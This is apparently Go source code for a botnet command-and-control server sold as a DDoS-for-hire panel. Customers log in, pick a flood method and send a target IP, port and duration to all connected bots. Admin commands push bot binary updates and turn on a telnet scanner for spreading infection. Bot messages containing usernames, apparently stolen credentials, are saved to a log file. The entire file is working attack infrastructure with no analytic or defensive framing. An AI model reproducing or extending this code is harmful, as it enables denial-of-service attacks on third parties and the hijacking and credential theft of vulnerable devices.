package main

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func log_acc(client *user) (user, bool) {
	for _, c := range users {
		if c.Username == client.Username && c.Password == client.Password {
			return c, true
		}
	}

	return users[0], false
}

func handle_connection_client(connection net.Conn) {
	defer func() { connected_clients-- }()
	connected_clients++
	var client user

	client.Theme = themes[0]

	go func() {
		t := time.Now().Add(time.Second * time.Duration(30))
		i := 30

		for !client.Logged {
			i--

			if time.Now().Before(t) {
				_, err := connection.Write([]byte(get_title(fmt.Sprintf("%d Users | %d/%d Attemp | Disconnected on %ds", connected_clients, client.Retry, max_retry, i))))

				if err != nil {
					break
				}

				time.Sleep(1 * time.Second)
			} else {
				connection.Write([]byte(clear))
				connection.Write([]byte(fmt.Sprintf("%sTimeout reached !", white)))
				time.Sleep(3 * time.Second)
				connection.Close()
				break
			}
		}

		for {
			items := []string{"/", "-", "\\"}

			for _, item := range items {
				_, err := connection.Write([]byte(get_title(fmt.Sprintf("[%s] %d Slaves | %d Connected | Concurrents: %d/%d | Cooldown: %d/%d | Running: %d", item, connected_bots, connected_clients, client.UsedConcurent, client.Concurent, client.CooldownTime, client.Cooldown, running_attacks))))

				if err != nil {
					break
				}

				time.Sleep(1 * time.Second)
			}
		}

	}()

	connection.Write([]byte(clear))
	connection.Write([]byte(get_banner(&client)))

	for !client.Logged {
		ip, _, _ := net.SplitHostPort(connection.RemoteAddr().String())

		if include(ip, banned_ips) {
			connection.Write([]byte(fade(fmt.Sprintf("%sYou are temporarily banned !", red), 5)))
			time.Sleep(3 * time.Second)
			connection.Close()
			break
		}

		if client.Retry >= max_retry {
			connection.Write([]byte(clear))
			connection.Write([]byte(fmt.Sprintf("%sMax retry reached !, please retry in 5min.", white)))

			go temp_ban_thread(ip, 500)

			time.Sleep(3 * time.Second)
			connection.Close()
			break
		} else {
			client.Retry++
		}

		client.Username = input(fmt.Sprintf("\r\n%sUsername%s: ", orange, reset), connection)
		client.Password = input(fmt.Sprintf("\r%sPassword%s:%s ", orange, reset, invisible), connection)

		user, sucess := log_acc(&client)

		if sucess {
			client = user
			client.Logged = true

			if client.Banned {
				connection.Write([]byte(fade(fmt.Sprintf("%sYour account is banned !", red), 5)))
				time.Sleep(3 * time.Second)
				connection.Close()
				break
			}

			for {
				clear_terminal(&client, connection)
				input_data := input(get_line(&client), connection) //input(fmt.Sprintf("\r%s)%s%s ", orange, client.Theme.Content.Line ,white), connection)
				send_gif(connection)
				clear_terminal(&client, connection)

				arg := strings.Split(input_data, " ")
				command := arg[0]
				args := arg[1:]

				if command == "err" {
					break
				}

				if command == "exit" {
					connection.Write([]byte(clear))
					connection.Write([]byte(fmt.Sprintf("%s♥%s Goodbye !", red, white)))

					time.Sleep(3 * time.Second)

					connection.Close()
					break
				}

				if command == "themes" {
					for _, theme := range themes {
						connection.Write([]byte(fmt.Sprintf("Name: %s - Description: %s\r\n", theme.Name, theme.Description)))
					}

					input(fade("\r\nPress to continue...", 10), connection)
				}

				if command == "profil" {
					connection.Write([]byte(get_profil_banner(&client)))
					input(fade("\r\nPress to continue...", 10), connection)
				}

				if command == "methods" {
					connection.Write([]byte(get_methods_banner(&client)))
					input(fade("\r\nPress to continue...", 10), connection)
				}

				if command == "port" {
					connection.Write([]byte(get_port_banner(&client)))
					input(fade("\r\nPress to continue...", 10), connection)
				}

				if command == "help" {
					connection.Write([]byte(get_help_banner(&client)))
					input(fade("\r\nPress to continue...", 10), connection)
				}

				if command == "tools" {
					connection.Write([]byte(get_tools_banner(&client)))
					input(fade("\r\nPress to continue...", 10), connection)
				}

				if command == "admin" {
					if !client.Admin {
						connection.Write([]byte(get_not_an_admin_banner(&client)))
					} else {
						connection.Write([]byte(get_admin_command_banner(&client)))
					}

					input(fade("\r\nPress to continue...", 10), connection)
				}

				if client.Admin {
					if command == "update_bin" {
						go send_all_bots("! UPDATE")
					}

					if command == "bots" {
						connection.Write([]byte(get_bots_type_banner(&client)))
						input(fade("\r\nPress to continue...", 10), connection)
					}

					if command == "set_scanner" {

						if len(args) != 1 {
							connection.Write([]byte(get_invalid_args_banner(".set_scanner <ON/OFF>", &client)))
						} else {
							if args[0] == "ON" {
								go send_all_bots("! TELNETSCANNER ON")
								connection.Write([]byte(get_text_banner(white, "scanner -> ON", &client)))
							} else {
								go send_all_bots("! TELNETSCANNER OFF")
								connection.Write([]byte(get_text_banner(white, "scanner -> OFF", &client)))
							}
						}

						input(fade("\r\nPress to continue...", 10), connection)
					}
				}

				if command == "set_theme" {
					if len(args) != 1 {
						connection.Write([]byte(get_invalid_args_banner("set_theme <theme_name>", &client)))
					} else {
						// update theme of the user and save into mongodb
						for _, theme := range themes {
							if theme.Name == args[0] {
								client.Theme = theme
								set_theme(client.Username, args[0])
								break
							}
						}
					}
				}

				if command == "checkport" {
					if len(args) != 2 {
						connection.Write([]byte(get_invalid_args_banner("cнecĸporт <ιp> <porт>", &client)))
					} else {
						ip := args[0]
						port, _ := strconv.Atoi(args[1])

						if CheckPort(ip, port) {
							connection.Write([]byte(get_text_banner(green, fmt.Sprintf("porт %d ιѕ opeɴ oɴ %s !", port, ip), &client)))
						} else {
							connection.Write([]byte(get_text_banner(red, fmt.Sprintf("porт %d ιѕ cloѕed oɴ %s !", port, ip), &client)))
						}

						input(fade("\r\nPress to continue...", 10), connection)
					}
				}

				if user.Admin {
					if command == "stop" {
						//stresser_api_stop()
						go send_all_bots("! STOP")
					}

					if command == "ban" {
						if len(args) != 2 {
							connection.Write([]byte(get_invalid_args_banner("вαɴ <υѕer> <true/false>", &client)))
						} else {
							b, _ := strconv.ParseBool(args[1])
							set_ban(args[0], b)

							if b {
								connection.Write([]byte(get_text_banner(green, fmt.Sprintf("υѕer %s ιѕ ɴow вαɴɴed !", args[0]), &client)))
							} else {
								connection.Write([]byte(get_text_banner(green, fmt.Sprintf("υѕer %s ιѕ ɴow υɴвαɴɴed !", args[0]), &client)))
							}
						}

						input(fade("\r\nPress to continue...", 10), connection)
					}
				}

				fmt.Println(command, len(args), args)

				if len(args) == 3 {
					ip := args[0]
					port := args[1]
					time, _ := strconv.Atoi(args[2])

					/*if len(args) == 4 {
						x, _ := strconv.Atoi(args[3])
						concurent = x
					}*/

					if client.UsedConcurent == int(client.Concurent) {
						connection.Write([]byte(get_text_banner(white, fmt.Sprintf("αll coɴcυreɴт υѕed:  %d/%d", client.UsedConcurent, client.Concurent), &client)))
						input(fade("\r\nPress to continue...", 10), connection)
					} else if client.CooldownTime != 0 {
						connection.Write([]byte(get_text_banner(white, fmt.Sprintf("Pleαѕe wαιт cooldowɴ тιмe: %d/%ds", client.CooldownTime, client.Cooldown), &client)))
						input(fade("\r\nPress to continue...", 10), connection)
					} else if time > int(client.MaxTime) {
						connection.Write([]byte(get_text_banner(white, fmt.Sprintf("Yoυr мαх вooт тιмe ιѕ %ds, pleαѕe υpɢrαde yoυr plαɴ !", int(client.MaxTime)), &client)))
						input(fade("\r\nPress to continue...", 10), connection)
					} else {

						if IsBlacklistIp(ip) {
							connection.Write([]byte(get_text_banner(red, "тнιѕ тαrɢeт ιѕ вlαcĸlιѕтed", &client)))
							input(fade("\r\nPress to continue...", 10), connection)
						} else {
							client.CooldownTime = int(client.Cooldown)
							client.UsedConcurent += 1

							go cooldown_thread(&client)
							go concurent_thread(time, &client)
							go running_attack_thread(time)

							switch command {
							
							/*case ".tcp":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! TCP %s %s %d ALL 1024 1 32", ip, port, time))
								}
							case ".udp":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! UDP %s %s %d 32 1024 10", ip, port, time))
								}
							case ".stomp":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! STOMP %s %s %d 32 ALL 1024 10", ip, port, time))
								}
							case ".xmas":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! XMAS %s %s %d 32 1024 10", ip, port, time))
								}*/
							case ".std":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! STD %s %s %d", ip, port, time))
								}

							case ".hex":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! HEX %s %s %d", ip, port, time))
								}

							case ".hexbig":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! HEXBIG %s %s %d", ip, port, time))
								}

							case ".mix":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! STD %s %s %d", ip, port, time))
									go send_all_bots(fmt.Sprintf("! HEX %s %s %d", ip, port, time))
								}

							/*case ".junk":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! JUNK %s %s %d", ip, port, time))
								}
							case ".hold":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! HOLD %s %s %d", ip, port, time))
								}
							case ".cnc":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! CNC %s %s %d", ip, port, time))
								}

							case ".dominate":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! DOMINATE %s %s %d 10", ip, port, time))
								}*/

							case ".http":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! HTTP GET %s %s / %d 100", ip, port, time))
								}

							/*case ".cloudfare":
								for i := 0; i != 300; i++ {
									go send_all_bots(fmt.Sprintf("! CLOUDFLARE GET %s %s / %d 100", ip, port, time))
								}*/

							default:
								if client.Premium {
									//stresser_api_send(ip, port, arg[2], strings.Split(command, ".")[1])
								}
							}

							connection.Write([]byte(get_attack_send_banner(&client, strings.Split(command, ".")[1], time, ip, port)))
							input(fade("\r\nPress to continue...", 10), connection)
						}
					}
				}
			}
		}
	}
}

func handle_connection_bot(connection net.Conn) {
	var client bot
	client.connected = true

	client.ip = connection.RemoteAddr().String()
	client.connection = connection

	for _, bot := range bots {
		if strings.Split(bot.ip, ":")[0] == strings.Split(client.ip, ":")[0] {
			fmt.Printf("*! Duplicate bot: %s\n", client.ip)
			connection.Write([]byte("!* DUPL\n"))

			client.connected = false
			connection.Close()
			break
		}
	}

	if !client.connected {
		return
	}

	fmt.Printf("*! New bot: %s\n", client.ip)
	bots = append(bots, client)

	go func() {
		//connection.Write([]byte("!* TELNETSCANNER ON\n"))

		for {
			_, err := connection.Write([]byte("PING\n"))

			if err != nil {
				client.connected = false
				connection.Close()
				break
			}

			time.Sleep(15 * time.Second)
		}

		remove_bot(&client)
		connected_bots--

		switch client.build {
		case "x86_64":
			bots_types.x86_64--
		case "x86_32":
			bots_types.x86_32--
		case "ARM2":
			bots_types.ARM2--
		case "ARM3":
			bots_types.ARM3--
		case "ARM4T":
			bots_types.ARM4T--
		case "ARM5":
			bots_types.ARM5--
		case "ARM6T2":
			bots_types.ARM6T2--
		case "ARM6":
			bots_types.ARM6--
		case "ARM7":
			bots_types.ARM7--
		case "ARM64":
			bots_types.ARM64--
		case "MIPS":
			bots_types.MIPS--
		case "SUPERH":
			bots_types.SUPERH--
		case "POWERPC":
			bots_types.POWERPC--
		case "SPARC":
			bots_types.SPARC--
		case "M68K":
			bots_types.M68K--
		default:
			bots_types.UNKNOWN_Build--
		}

		switch client.arch {
		case "BIG_ENDIAN":
			bots_types.BIG_ENDIAN--
		case "LITTLE_ENDIAN":
			bots_types.LITTLE_ENDIAN--
		case "BIG_ENDIAN_W":
			bots_types.BIG_ENDIAN_W--
		case "LITTLE_ENDIAN_W":
			bots_types.LITTLE_ENDIAN_W--
		case "UNKNOWN_Endian":
		default:
			bots_types.UNKNOWN_Endian--
		}
	}()

	connected_bots++

	for client.connected {
		data := input("", connection)

		if data == "err" {
			client.connected = false
			break
		}

		fmt.Printf("!* Data from bot %s --> %s\n", client.ip, data)

		args := strings.Split(data, "|")

		if strings.Contains(args[0], "Arch") {
			arch_type := strings.Split(args[1], ":")[1]
			arch_build := strings.Split(args[0], ":")[1]

			client.arch = arch_type
			client.build = arch_build

			switch arch_build {
			case "x86_64":
				bots_types.x86_64++
			case "x86_32":
				bots_types.x86_32++
			case "ARM2":
				bots_types.ARM2++
			case "ARM3":
				bots_types.ARM3++
			case "ARM4T":
				bots_types.ARM4T++
			case "ARM5":
				bots_types.ARM5++
			case "ARM6T2":
				bots_types.ARM6T2++
			case "ARM6":
				bots_types.ARM6++
			case "ARM7":
				bots_types.ARM7++
			case "ARM64":
				bots_types.ARM64++
			case "MIPS":
				bots_types.MIPS++
			case "SUPERH":
				bots_types.SUPERH++
			case "POWERPC":
				bots_types.POWERPC++
			case "SPARC":
				bots_types.SPARC++
			case "M68K":
				bots_types.M68K++
			default:
				bots_types.UNKNOWN_Build++
			}

			switch arch_type {
			case "BIG_ENDIAN":
				bots_types.BIG_ENDIAN++
			case "LITTLE_ENDIAN":
				bots_types.LITTLE_ENDIAN++
			case "BIG_ENDIAN_W":
				bots_types.BIG_ENDIAN_W++
			case "LITTLE_ENDIAN_W":
				bots_types.LITTLE_ENDIAN_W++
			case "UNKNOWN_Endian":
			default:
				bots_types.UNKNOWN_Endian++
			}
		}

		if strings.Contains(data, "Username") {
			f, err := os.OpenFile("log_hit.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
			}

			defer f.Close()

			if _, err := f.WriteString(data + "\n"); err != nil {
				fmt.Println(err)
			}
		}
	}
}

func socket_client_thread() {
	socket, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", cnc_port))

	if err != nil {
		panic(err)
	}

	fmt.Printf("*! Client socket open on: %s\n", socket.Addr().String())

	for {
		connection, err := socket.Accept()

		if err != nil {
			fmt.Printf("!* Error when accept client: %s\n", err)
		} else {
			go handle_connection_client(connection)
		}
	}
}

func socket_bot_thread() {
	socket, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", bot_port))

	if err != nil {
		panic(err)
	}

	fmt.Printf("*! Bot socket open on: %s\n", socket.Addr().String())

	for {
		connection, err := socket.Accept()

		if err != nil {
			fmt.Printf("!* Error when accept bot: %s\n", err)
		} else {
			go handle_connection_bot(connection)
		}
	}
}

func main() {
	init_db()
	load_themes()

	go run_bot()
	go load_users()
	go socket_bot_thread()
	go socket_client_thread()
	go load_blacklisted_target()

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc
}
